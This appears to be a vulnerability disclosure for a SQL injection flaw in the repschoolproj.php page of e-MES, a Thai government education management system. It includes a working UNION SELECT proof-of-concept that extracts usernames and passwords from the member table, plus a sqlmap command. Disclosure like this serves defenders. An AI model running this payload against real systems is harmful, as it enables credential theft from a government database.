`Describe：`
E-mes is an education management system of Thailand's basic education department. It has a serious SQL injection vulnerability, through which many sensitive information in the database can be obtained. This affects the whole e-mes version. As this is a system of the Thai government department, it can't be found on GitHub for the time being,I found a usage document in the government affairs section.

`Official documents`
>https://www.br2.go.th/attachments/article/2902/%E0%B9%81%E0%B8%9A%E0%B8%9A%E0%B8%A3%E0%B8%B2%E0%B8%A2%E0%B8%87%E0%B8%B2%E0%B8%99%E0%B8%82%E0%B9%89%E0%B8%AD%E0%B8%A1%E0%B8%B9%E0%B8%A5%E0%B9%83%E0%B8%99%E0%B8%A3%E0%B8%B0%E0%B8%9A%E0%B8%9A%20e-MES.pdf

`Attack Vectors`
> A SQL injection vulnerability exists in the school information query interface (repschoolproj.php) of the EMS system of the Office of the Thai Basic Education Commission, which can lead to important data leakage.This website is owned by the Thai government, and if it is not repaired in time, it may lead to information leakage.

`POC:` 
> http://localhost/eme/repschoolproj.php?claster=school&idarea=648 repschoolproj.php?claster=school&idarea=648   uNiOn select 1,1,user,1,1,1,1,1,2,3,4,5,6,7,1,1,9,10,passwd,12,13,1,1,1,1,user(),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from member#  
> This exp can get the login account and password of the e-mes system  
`photo proof`
![图片](https://user-images.githubusercontent.com/110643835/188271982-779a174a-41e3-47dd-b9eb-3ed62e59b4bb.png)
![图片](https://user-images.githubusercontent.com/110643835/188272051-c3890348-ee21-472e-b10e-2519c4ffd64a.png)


Or use sqlmap for injection
> POC: sqlmap.py -u "http://localhost/eme/repschoolproj.php?claster=school&idarea=648*"

